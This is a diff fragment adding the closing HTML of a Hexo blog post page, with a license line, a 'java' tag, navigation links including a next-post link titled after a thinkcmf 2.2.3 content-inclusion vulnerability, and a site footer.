+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/java/"># java</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/12/14/thincmf2-2-3%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">thincmf2.2.3任意内容包含漏洞</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© ShangZeng | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
